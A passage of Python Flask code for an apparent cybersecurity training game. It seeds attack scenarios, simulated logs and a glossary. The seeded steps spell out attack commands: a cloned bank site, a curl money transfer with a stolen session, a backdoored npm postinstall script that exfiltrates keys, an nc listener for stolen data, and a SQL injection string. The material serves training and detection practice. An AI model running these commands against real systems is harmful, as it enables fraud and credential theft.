              (7,4,'Clone Site','Clone target banking site','clone_site','httrack --mirror https://targetbank.com -O /var/www/fake','Clone website','Site cloned at 10.0.0.99'),
              (7,5,'Harvest Creds','Capture redirected user creds','harvest','harvest --listen 443 --log creds.txt','Start harvester','Login captured: acct 4521-XXXX'),
              (7,6,'Fraudulent Transfer','Execute unauthorized transfer','transfer','curl -b stolen_session https://targetbank.com/api/transfer --data "amount=50000"','Execute transfer','Transfer: $50K | TXN-8847231')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 8: Supply Chain Attack
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Supply Chain Attack', 'Compromise a software dependency to inject malicious code downstream', 'Supply Chain', 'Advanced',
     'OWASP Top 10|https://tryhackme.com/room/owasptop10;Intro to Malware|https://tryhackme.com/room/malmalintroductory',
     'YARA|https://tryhackme.com/room/yara;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(8,1,'Find Package','Identify vulnerable package','find_package','npm search analytics-helper --popularity desc','Search npm','Target: analytics-helper v2.1.3 | 50K downloads'),
              (8,2,'Compromise Maintainer','Gain maintainer access','compromise_account','credential-spray --target npmjs.com --user pkg-maintainer','Spray credentials','Maintainer compromised | No MFA'),
              (8,3,'Inject Backdoor','Add malicious install script','inject_code','npm version patch && echo "require(./backdoor)" >> postinstall.js','Inject backdoor','Backdoor: exfiltrates env vars + SSH keys'),
              (8,4,'Publish Malicious','Push to registry','publish','npm publish --tag latest','Publish package','v2.1.4 published | 3,200 installs in 24h'),
              (8,5,'Collect Data','Harvest stolen credentials','collect_data','nc -lvp 8443 >> stolen.txt','Listen for data','847 SSH keys, 1,204 API tokens received'),
              (8,6,'Pivot to Enterprise','Access high-value target','pivot','ssh -i stolen_key.pem admin@enterprise-target.com','SSH with stolen key','Access: enterprise-target.com | AWS root creds')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # LUCA KNOWLEDGE BASE
    # ==========================================
    for entry in [
        ('Phishing','Social Engineering','Social engineering attack using fraudulent messages to trick people into revealing sensitive information.','Email from "admin@compny.com" asking to verify your password.'),
        ('SQL Injection','Web Security','Code injection exploiting database vulnerabilities by inserting malicious SQL into input fields.',"Entering ' OR 1=1-- into a login form to bypass authentication."),
        ('Ransomware','Malware','Malware encrypting victim files and demanding ransom for decryption keys.','WannaCry encrypted 200K+ computers across 150 countries.'),
        ('ARP Spoofing','Network','Sending falsified ARP messages on a LAN to intercept traffic between two parties.','Fake ARP replies linking attacker MAC with gateway IP.'),
        ('DDoS','Network','Distributed Denial of Service — flooding a target from multiple sources to deny availability.','100K IoT botnet flooding a server with 50Gbps.'),
        ('DNS Poisoning','Network','Corrupting DNS cache so a domain resolves to the wrong (malicious) IP address.','Poisoning resolver so bank.com points to attacker server.'),
        ('Lateral Movement','Tactics','Post-access techniques to move through a network seeking key data and assets.','Using stolen admin credentials to SSH between servers.'),
        ('Meterpreter','Tools','Advanced Metasploit payload providing interactive post-exploitation shell.','Using "meterpreter> hashdump" to extract password hashes.'),
        ('MITRE ATT&CK','Frameworks','Knowledge base of adversary tactics and techniques for threat modeling and defense.','Mapping incident to T1566 (Phishing) for structured analysis.'),
        ('Chain of Custody','Forensics','Documentation tracking evidence from collection to courtroom for integrity.','Logging who handled a hard drive, when, and what was done.'),
        ('Volatility','Forensics','Open-source memory forensics framework for analyzing RAM dumps.','Running "vol.py pslist" to list processes from memory dump.'),
        ('Zero-Day','Vulnerabilities','Vulnerability unknown to vendor with no available patch.','Log4Shell (CVE-2021-44228) — zero-day in Log4j library.'),
        ('Nmap','Tools','Network Mapper — tool for network discovery and security auditing.','Running "nmap -sV target.com" to detect service versions.'),
        ('Wireshark','Tools','Network protocol analyzer for packet-level traffic inspection.','Filtering "http.request.method == POST" to find logins.'),
        ('Supply Chain Attack','Tactics','Compromising supply chain elements to reach the ultimate target.','SolarWinds: malicious code in updates hit 18K+ orgs.'),
        ('Privilege Escalation','Tactics','Exploiting flaws to gain higher access — user to root/admin.','Exploiting SUID misconfiguration for root access.'),
        ('Data Exfiltration','Tactics','Unauthorized transfer of data to an attacker-controlled destination.','SCP database dump to personal server.'),
        ('Incident Response','Forensics','Organized approach to manage security breaches and limit damage.','NIST framework: Prepare, Detect, Contain, Eradicate, Recover.'),
        ('Social Engineering','Tactics','Psychological manipulation to trick people into revealing information.','Calling helpdesk pretending to be the CEO.'),
        ('Hash Cracking','Techniques','Recovering plaintext passwords from hashes using wordlists.','hashcat -m 0 hashes.txt rockyou.txt to crack MD5.')]:
        cursor.execute('INSERT INTO luca (term, category, definition, example) VALUES (?,?,?,?)', entry)

    db.commit()
    db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scenarios', methods=['GET'])
def get_scenarios():
    """Get all available attack scenarios"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM scenarios')
    scenarios = [dict(row) for row in cursor.fetchall()]
    db.close()
    return jsonify(scenarios)

@app.route('/api/scenario/<int:scenario_id>', methods=['GET'])
def get_scenario_details(scenario_id):
    """Get detailed scenario with all steps"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM scenarios WHERE id = ?', (scenario_id,))
    scenario = dict(cursor.fetchone())
    
    cursor.execute('SELECT * FROM attack_steps WHERE scenario_id = ? ORDER BY step_number', (scenario_id,))
    steps = [dict(row) for row in cursor.fetchall()]
    scenario['steps'] = steps
    
    db.close()
    return jsonify(scenario)

@app.route('/api/company-files/<int:scenario_id>', methods=['GET'])
def get_company_files(scenario_id):
    """Get list of fake company files for a scenario"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT id, scenario_id, company_name, filename, filepath, file_type FROM company_files WHERE scenario_id = ?', (scenario_id,))
    files = [dict(row) for row in cursor.fetchall()]
    company_name = files[0]['company_name'] if files else 'Unknown'
    db.close()
    return jsonify({'company_name': company_name, 'files': files})

@app.route('/api/company-file/<int:file_id>', methods=['GET'])
def get_company_file(file_id):
    """Get full content of a fake company file"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM company_files WHERE id = ?', (file_id,))
    row = cursor.fetchone()
    db.close()
    if row:
        return jsonify(dict(row))
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/allowed-commands/<int:scenario_id>', methods=['GET'])
def get_allowed_commands(scenario_id):
    """Return whitelist of allowed command prefixes for a scenario"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT command FROM attack_steps WHERE scenario_id = ?', (scenario_id,))
    rows = cursor.fetchall()
    db.close()
    # Extract the first word (tool name) from each command
    tools = list(set(row['command'].split()[0].lower() for row in rows if row['command']))
    builtins = ['help', 'hint', 'status', 'ls', 'cat', 'clear']
    return jsonify({'allowed': builtins + tools})

@app.route('/api/commands', methods=['GET'])
def get_all_commands():
    """Get all commands grouped by scenario for the Command List page"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('''
        SELECT s.name as scenario_name, s.attack_type, a.step_number, a.title, a.command, a.command_hint, a.description
        FROM attack_steps a
        JOIN scenarios s ON a.scenario_id = s.id
        ORDER BY s.id, a.step_number
    ''')
    rows = [dict(row) for row in cursor.fetchall()]
    db.close()
    
    # Group by scenario
    grouped = {}
    for row in rows:
        name = row['scenario_name']
        if name not in grouped:
            grouped[name] = {'attack_type': row['attack_type'], 'commands': []}
        grouped[name]['commands'].append({
            'step': row['step_number'],
            'title': row['title'],
            'command': row['command'],
            'hint': row['command_hint'],
            'description': row['description']
        })
    
    return jsonify(grouped)

@app.route('/api/start-session', methods=['POST'])
def start_session():
    """Start a new attack or detect mode session"""
    data = request.json
    scenario_id = data.get('scenario_id')
    mode = data.get('mode')  # 'attack' or 'detect'
    session_id = f"{scenario_id}_{mode}_{datetime.now().timestamp()}"
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute('''INSERT INTO sessions (session_id, scenario_id, mode, created_at)
    VALUES (?, ?, ?, ?)''',
    (session_id, scenario_id, mode, datetime.now().isoformat()))
    db.commit()
    db.close()
    
    return jsonify({'session_id': session_id, 'scenario_id': scenario_id})

@app.route('/api/validate-command', methods=['POST'])
def validate_command():
    """Validate a user-typed command against the expected command for a step"""
    data = request.json
    step_id = data.get('step_id')
    user_command = data.get('command', '').strip()
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM attack_steps WHERE id = ?', (step_id,))
    step = dict(cursor.fetchone())
    db.close()
    
    expected = step['command'].strip()
    
    # Fuzzy matching: check if core command/tool name matches
    expected_parts = expected.lower().split()
    user_parts = user_command.lower().split()
    
    # Exact match
    if user_command.lower() == expected.lower():
        return jsonify({'valid': True, 'match': 'exact', 'message': 'Command accepted!'})
    
    # Check if the main tool/command matches (first word or two)
    if len(user_parts) >= 1 and len(expected_parts) >= 1:
        if user_parts[0] == expected_parts[0]:
            # At least the tool name matches — accept with note
            return jsonify({'valid': True, 'match': 'partial', 'message': f'Command accepted. Full syntax: {expected}'})
    
    return jsonify({
        'valid': False,
        'match': 'none',
        'hint': step['command_hint'],
        'message': 'Incorrect command. Check the hint below.'
    })

@app.route('/api/execute-step', methods=['POST'])
def execute_step():
    """Execute an attack step and generate logs"""
    data = request.json
    session_id = data.get('session_id')
    scenario_id = data.get('scenario_id')
    step_id = data.get('step_id')
    
    db = get_db()
    cursor = db.cursor()
    
    # Get step details
    cursor.execute('SELECT * FROM attack_steps WHERE id = ?', (step_id,))
    step = dict(cursor.fetchone())
    
    # Generate realistic logs based on step
    logs = generate_logs_for_step(scenario_id, session_id, step)
    
    # Store logs
    for log in logs:
        cursor.execute('''INSERT INTO generated_logs 
        (scenario_id, session_id, log_type, timestamp, content, is_evidence)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (scenario_id, session_id, log['type'], log['timestamp'], log['content'], 1))
    
    db.commit()
    
    # Get all logs so far
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    all_logs = [dict(row) for row in cursor.fetchall()]
    db.close()
    
    return jsonify({
        'step': step,
        'logs': all_logs,
        'message': f"Step executed: {step['title']}"
    })

@app.route('/api/session-logs/<session_id>', methods=['GET'])
def get_session_logs(session_id):
    """Get all logs for a session (for Detect Mode)"""
    db = get_db()
    cursor = db.cursor()
    
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    
    db.close()
    return jsonify(logs)

@app.route('/api/analyze-logs', methods=['POST'])
def analyze_logs():
    """Analyze logs and provide investigation hints"""
    data = request.json
    session_id = data.get('session_id')
    user_analysis = data.get('analysis')
    
    db = get_db()
    cursor = db.cursor()
    
    # Get session scenario
    cursor.execute('SELECT scenario_id FROM sessions WHERE session_id = ?', (session_id,))
    session = cursor.fetchone()
    
    # Get actual logs from attack mode
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    
    # Analyze if user found key evidence
    findings = analyze_for_evidence(logs, user_analysis)
    
    db.close()
    return jsonify(findings)

def generate_logs_for_step(scenario_id, session_id, step):
    """Generate realistic logs based on attack step"""
    logs = []
    base_time = datetime(2024, 1, 15, 10, 23)
    offset = (step['step_number'] - 1) * 90  # 90 seconds between steps

    # Scenario 1: Phishing
    if scenario_id == 1:
        if step['step_number'] == 1:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Attacker identified domain: company.com | Target email: user@company.com'})
        elif step['step_number'] == 2:
            logs.append({'type': 'email_draft', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Email Subject: URGENT: Update Your Password\nFrom: admin@compny.com\nBody: Click here to verify your account...'})
        elif step['step_number'] == 3:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Phishing portal deployed at: http://secure-login.fake-domain.com/login'})
        elif step['step_number'] == 4:
            logs.append({'type': 'email_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Email sent to user@company.com | Subject: URGENT: Update Your Password | Sender: admin@compny.com'})
        elif step['step_number'] == 5:
            logs.extend([
                {'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': 'User clicked link | User-Agent: Mozilla/5.0 | Source IP: 203.0.113.45 | Destination: secure-login.fake-domain.com'},
                {'type': 'credential_log', 'timestamp': (base_time + timedelta(seconds=offset+10)).isoformat(),
                    'content': 'Credentials submitted | Username: user@company.com | IP: 203.0.113.45'}
            ])
        elif step['step_number'] == 6:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'SSH authentication successful | User: user@company.com | Source IP: 192.168.1.100 | Authentication method: password'})

    # Scenario 2: SQL Injection
    elif scenario_id == 2:
        base_time = datetime(2024, 2, 20, 14, 10)
        if step['step_number'] == 1:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Directory scan detected | Source: 10.0.0.88 | 247 requests in 30s | Paths: /login, /search, /admin, /api'})
        elif step['step_number'] == 2:
            logs.extend([
                {'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': "GET /search?q=' OR 1=1-- | Source: 10.0.0.88 | Response: 200 | Size: 15KB (abnormal)"},
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset+5)).isoformat(),
                    'content': "SQL Error suppressed: You have an error in your SQL syntax near '' OR 1=1--'"}
            ])
        elif step['step_number'] == 3:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "UNION SELECT table_name FROM information_schema.tables | DB: webapp_db | Tables found: users, payments, sessions"})
        elif step['step_number'] == 4:
            logs.append({'type': 'credential_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "SELECT * FROM users | 847 rows extracted | Columns: id, username, email, password_hash, role, created_at"})
        elif step['step_number'] == 5:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "Hash cracked: admin@target.com | Algorithm: MD5 | Password: Str0ngP@ss! | Role: administrator"})
        elif step['step_number'] == 6:
            logs.extend([
                {'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': "Admin login from 10.0.0.88 | User: admin@target.com | Session: admin_cookie_xyz"},
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset+15)).isoformat(),
                    'content': "Data export: /admin/export?table=payments | 2,341 records | Contains: card_number, cvv, billing_address"}
            ])

    # Scenario 3: Malware & Ransomware
    elif scenario_id == 3:
        base_time = datetime(2024, 4, 5, 3, 30)
        if step['step_number'] == 1:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Payload compiled: update_patch.exe | Size: 73802 bytes | Type: PE32 executable | Detected AV evasion techniques'})
        elif step['step_number'] == 2:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Exploit kit injected into compromised-site.com | Drive-by download configured | Target browsers: Chrome, Edge, Firefox'})
        elif step['step_number'] == 3:
            logs.extend([
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': 'Victim visited compromised-site.com | Download triggered: update_patch.exe | Executed with user privileges'},
                {'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset+10)).isoformat(),
                    'content': 'Meterpreter session 1 opened | Target: 192.168.1.50 (DESKTOP-VICTIM) | OS: Windows 10 Pro | User: jsmith'}
            ])
        elif step['step_number'] == 4:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Registry key added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | SMB spread to 192.168.1.51, 192.168.1.52'})
        elif step['step_number'] == 5:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Encryption started | Algorithm: AES-256-CBC | Files encrypted: 14,832 | Extensions: .docx, .xlsx, .pdf, .jpg, .sql'})
        elif step['step_number'] == 6:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Ransom note: README_DECRYPT.txt | Demand: 2 BTC (~$85,000) | Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa | Deadline: 72h'})

    # Scenario 4: Insider Threat
    elif scenario_id == 4:
        base_time = datetime(2024, 3, 10, 22, 15)
        if step['step_number'] == 1:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Database login: john.doe@internal | DB: customer_data | Time: 22:15 (outside business hours) | Source: VPN 10.0.0.200'})
        elif step['step_number'] == 2:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'pg_dump executed on customer_data | Tables: credit_cards, ssn_records | Output: /tmp/.cache_data | Size: 128MB'})
        elif step['step_number'] == 3:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'SCP transfer initiated | Source: /tmp/.cache_data | Dest: personal-server.com | Size: 128MB | Duration: 45s'})
        elif step['step_number'] == 4:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'File shredded: /tmp/.cache_data (5-pass) | Bash history cleared | Last login timestamp modified to 09:00'})
        elif step['step_number'] == 5:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Tor connection established | Marketplace: xxxxxxx.onion | Listing: "45K customer records with PII" | Price: $50,000'})
        elif step['step_number'] == 6:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(hours=11)).isoformat(),
                'content': 'Normal login: john.doe@internal | Time: 09:00 | Workstation: DESK-JD-042 | No anomalies in scheduled access'})

    # Scenario 5-8: Generic log generation
    elif scenario_id in [5, 6, 7, 8]:
        base_time = datetime(2024, 5, 20, 9, 0)
        log_types = ['system_log', 'web_access_log', 'authentication_log', 'system_log']
        lt = log_types[step['step_number'] % len(log_types)]
        logs.append({'type': lt, 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
            'content': step['log_entry']})

    return logs

def generate_noise_logs(real_logs, count=8):
    """Generate benign noise logs to mix with real evidence in Detect Mode"""
    import random
    noise_templates = [
        ('system_log', 'Scheduled backup completed successfully | Duration: 2m 34s'),
        ('authentication_log', 'User login: sysadmin@internal | Source: 10.0.1.5 | Method: SSO'),
        ('system_log', 'Cron job executed: /etc/cron.daily/logrotate | Status: OK'),
        ('web_access_log', 'GET /health HTTP/1.1 | 200 | Response: 12ms | Monitor: UptimeRobot'),
        ('system_log', 'Antivirus definitions updated | Version: 2024.01.15.003'),
        ('authentication_log', 'VPN connection: remote-user@corp | Duration: 8h 15m | Normal hours'),
        ('system_log', 'Disk usage alert cleared: /var/log at 72% (was 85%)'),
        ('web_access_log', 'GET /api/status HTTP/1.1 | 200 | Internal health check'),
        ('system_log', 'NTP sync completed | Server: time.nist.gov | Drift: +0.003s'),
        ('authentication_log', 'Password change: hr-admin@internal | Policy: 90-day rotation'),
        ('system_log', 'SSL certificate renewal: *.company.com | Expires: 2025-01-15'),
        ('web_access_log', 'GET /favicon.ico HTTP/1.1 | 304 | Cache hit'),
        ('system_log', 'Firewall rule update: Allow TCP/443 from 10.0.0.0/8 | Admin: netops'),
        ('authentication_log', 'Failed login: unknown@external | Locked after 5 attempts | IP: 203.0.113.99'),
        ('system_log', 'Memory usage: 67% | Swap: 12% | No action required'),
    ]
    if not real_logs:
        return []
    timestamps = [log.get('timestamp', '2024-01-15T10:00:00') for log in real_logs]
    base = datetime.fromisoformat(timestamps[0]) if timestamps else datetime(2024, 1, 15, 10, 0)
    noise = []
    chosen = random.sample(noise_templates, min(count, len(noise_templates)))
    for i, (lt, content) in enumerate(chosen):
        t = base + timedelta(seconds=random.randint(-300, 600))
        noise.append({'id': 9000+i, 'scenario_id': 0, 'session_id': '', 'log_type': lt,
                      'timestamp': t.isoformat(), 'content': content, 'is_evidence': 0})
    return noise

def analyze_for_evidence(logs, user_analysis):
    """Check if user found key evidence"""
    evidence_logs = [l for l in logs if l.get('is_evidence', 1) != 0]
    found_email = any('admin@compny' in log['content'] for log in evidence_logs)
    found_domain = any('fake-domain' in log['content'] for log in evidence_logs)
    found_credentials = any('credential' in log['content'].lower() for log in evidence_logs)
    found_ssh = any('ssh' in log['content'].lower() and 'successful' in log['content'].lower() for log in evidence_logs)
    found_sqli = any('sql' in log['content'].lower() or 'union' in log['content'].lower() for log in evidence_logs)
    found_malware = any('meterpreter' in log['content'].lower() or 'encrypted' in log['content'].lower() for log in evidence_logs)
    found_insider = any('after hours' in log['content'].lower() or 'outside business' in log['content'].lower() for log in evidence_logs)
    found_exfil = any('scp' in log['content'].lower() or 'export' in log['content'].lower() for log in evidence_logs)
    
    return {
        'correct_findings': {
            'phishing_email_detected': found_email,
            'fake_domain_identified': found_domain,
            'credential_theft_found': found_credentials,
            'unauthorized_access_found': found_ssh,
            'sql_injection_detected': found_sqli,
            'malware_activity_found': found_malware,
            'insider_threat_detected': found_insider,
            'data_exfiltration_found': found_exfil
        },
        'score': sum([found_email, found_domain, found_credentials, found_ssh,
                      found_sqli, found_malware, found_insider, found_exfil]) * 12.5,
        'message': 'Investigation complete! Check your findings above.'
    }

# ==========================================
# NEW API ENDPOINTS
# ==========================================

@app.route('/api/user/profile', methods=['GET', 'POST'])
def user_profile():
    if request.method == 'POST':
        data = request.json
        username = data.get('username', '').strip()
        if not username:
            return jsonify({'error': 'Username required'}), 400
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
        existing = cursor.fetchone()
        if existing:
            db.close()
            return jsonify(dict(existing))
        cursor.execute('INSERT INTO user_profiles (username, xp, level, completed_scenarios, created_at) VALUES (?,?,?,?,?)',
            (username, 0, 1, '[]', datetime.now().isoformat()))
        db.commit()
        user_id = cursor.lastrowid
        db.close()
        return jsonify({'id': user_id, 'username': username, 'xp': 0, 'level': 1, 'completed_scenarios': '[]'})
    else:
        username = request.args.get('username', '')
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
        user = cursor.fetchone()
        db.close()
        if user:
            return jsonify(dict(user))
        return jsonify({'error': 'User not found'}), 404

@app.route('/api/user/xp', methods=['POST'])
def award_xp():
    data = request.json
    username = data.get('username', '')
    xp_amount = data.get('xp', 0)
    scenario_id = data.get('scenario_id')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    user = dict(user)
    new_xp = user['xp'] + xp_amount
    new_level = min(5, 1 + new_xp // 500)
    completed = json.loads(user['completed_scenarios'])
    if scenario_id and scenario_id not in completed:
        completed.append(scenario_id)
    cursor.execute('UPDATE user_profiles SET xp = ?, level = ?, completed_scenarios = ? WHERE username = ?',
        (new_xp, new_level, json.dumps(completed), username))
    db.commit()
    db.close()
    level_names = {1: 'Recruit', 2: 'Analyst', 3: 'Specialist', 4: 'Expert', 5: 'Elite'}
    leveled_up = new_level > user['level']
    return jsonify({'xp': new_xp, 'level': new_level, 'level_name': level_names.get(new_level, 'Recruit'),
                    'leveled_up': leveled_up, 'completed_scenarios': completed})

@app.route('/api/achievements', methods=['GET'])
def get_achievements():
    username = request.args.get('username', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify([])
    cursor.execute('SELECT achievement_key, unlocked_at FROM achievements WHERE user_id = ?', (user['id'],))
    unlocked = {row['achievement_key']: row['unlocked_at'] for row in cursor.fetchall()}
    db.close()
    all_achievements = [
        {'key': 'first_blood', 'name': 'First Blood', 'icon': '🩸', 'desc': 'Complete your first scenario'},
        {'key': 'speed_demon', 'name': 'Speed Demon', 'icon': '⚡', 'desc': 'Finish a scenario under 5 minutes'},
        {'key': 'perfect_analyst', 'name': 'Perfect Analyst', 'icon': '🎯', 'desc': 'Score 100% in Detect Mode'},
        {'key': 'red_master', 'name': 'Red Master', 'icon': '🔴', 'desc': 'Complete all Attack scenarios'},
        {'key': 'blue_master', 'name': 'Blue Master', 'icon': '🔵', 'desc': 'Complete all Detect scenarios'},
        {'key': 'knowledge_seeker', 'name': 'Knowledge Seeker', 'icon': '📚', 'desc': 'Read 10+ Luca entries'},
        {'key': 'elite_hacker', 'name': 'Elite Hacker', 'icon': '🏆', 'desc': 'Reach Level 5'},
        {'key': 'shadow_analyst', 'name': 'Shadow Analyst', 'icon': '🕵️', 'desc': 'Find all evidence without hints'},
        {'key': 'malware_hunter', 'name': 'Malware Hunter', 'icon': '💀', 'desc': 'Complete the malware scenario'},
        {'key': 'defender', 'name': 'Defender', 'icon': '🛡️', 'desc': 'Score 75%+ on 3 scenarios'},
        {'key': 'team_player', 'name': 'Team Player', 'icon': '👥', 'desc': 'Join a team'},
        {'key': 'duelist', 'name': 'Duelist', 'icon': '⚔️', 'desc': 'Complete a Red vs Blue session'},
    ]
    for a in all_achievements:
        a['unlocked'] = a['key'] in unlocked
        a['unlocked_at'] = unlocked.get(a['key'])
    return jsonify(all_achievements)

@app.route('/api/achievements/unlock', methods=['POST'])
def unlock_achievement():
    data = request.json
    username = data.get('username', '')
    key = data.get('achievement_key', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT id FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    cursor.execute('SELECT id FROM achievements WHERE user_id = ? AND achievement_key = ?', (user['id'], key))
    if cursor.fetchone():
        db.close()
        return jsonify({'already_unlocked': True})
    cursor.execute('INSERT INTO achievements (user_id, achievement_key, unlocked_at) VALUES (?,?,?)',
        (user['id'], key, datetime.now().isoformat()))
    db.commit()
    db.close()
    return jsonify({'unlocked': True, 'achievement_key': key})

@app.route('/api/dashboard', methods=['GET'])
def get_dashboard():
    username = request.args.get('username', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    user = dict(user)
    cursor.execute('SELECT COUNT(*) as cnt FROM achievements WHERE user_id = ?', (user['id'],))
    ach_count = cursor.fetchone()['cnt']
    cursor.execute('SELECT COUNT(*) as cnt FROM scenarios')
    total_scenarios = cursor.fetchone()['cnt']
    completed = json.loads(user['completed_scenarios'])
    db.close()
    level_names = {1: 'Recruit', 2: 'Analyst', 3: 'Specialist', 4: 'Expert', 5: 'Elite'}
    return jsonify({
        'username': user['username'], 'xp': user['xp'], 'level': user['level'],
        'level_name': level_names.get(user['level'], 'Recruit'),
        'xp_to_next': 500 - (user['xp'] % 500), 'xp_progress': (user['xp'] % 500) / 500 * 100,
        'completed_scenarios': len(completed), 'total_scenarios': total_scenarios,
        'achievements_unlocked': ach_count, 'total_achievements': 12
    })

@app.route('/api/luca', methods=['GET'])
def get_luca():
    db = get_db()
    cursor = db.cursor()
    search = request.args.get('search', '')
    category = request.args.get('category', '')
    if search:
        cursor.execute('SELECT * FROM luca WHERE term LIKE ? OR definition LIKE ?',
            (f'%{search}%', f'%{search}%'))
    elif category:
        cursor.execute('SELECT * FROM luca WHERE category = ?', (category,))
    else:
        cursor.execute('SELECT * FROM luca')
    entries = [dict(row) for row in cursor.fetchall()]
    cursor.execute('SELECT DISTINCT category FROM luca')
    categories = [row['category'] for row in cursor.fetchall()]
    db.close()
    return jsonify({'entries': entries, 'categories': categories})

@app.route('/api/teams', methods=['GET', 'POST'])
def teams():
    db = get_db()
    cursor = db.cursor()
    if request.method == 'POST':
        data = request.json
        action = data.get('action', 'create')
        if action == 'create':
            name = data.get('team_name', '').strip()
            username = data.get('username', '')
            if not name:
                db.close()
                return jsonify({'error': 'Team name required'}), 400
            try:
                cursor.execute('INSERT INTO teams (team_name, members, total_score, created_at) VALUES (?,?,?,?)',
                    (name, json.dumps([username]), 0, datetime.now().isoformat()))
                db.commit()
                db.close()
                return jsonify({'success': True, 'team_name': name})
            except sqlite3.IntegrityError:
                db.close()
                return jsonify({'error': 'Team name taken'}), 400
        elif action == 'join':
            name = data.get('team_name', '')
            username = data.get('username', '')
            cursor.execute('SELECT * FROM teams WHERE team_name = ?', (name,))
            team = cursor.fetchone()
            if not team:
                db.close()
                return jsonify({'error': 'Team not found'}), 404
            members = json.loads(team['members'])
            if username not in members:
                members.append(username)
                cursor.execute('UPDATE teams SET members = ? WHERE team_name = ?', (json.dumps(members), name))
                db.commit()
            db.close()
            return jsonify({'success': True, 'team_name': name, 'members': members})
        elif action == 'add_score':
            name = data.get('team_name', '')
            score = data.get('score', 0)
            cursor.execute('UPDATE teams SET total_score = total_score + ? WHERE team_name = ?', (score, name))
            db.commit()
            db.close()
            return jsonify({'success': True})
    cursor.execute('SELECT * FROM teams ORDER BY total_score DESC')
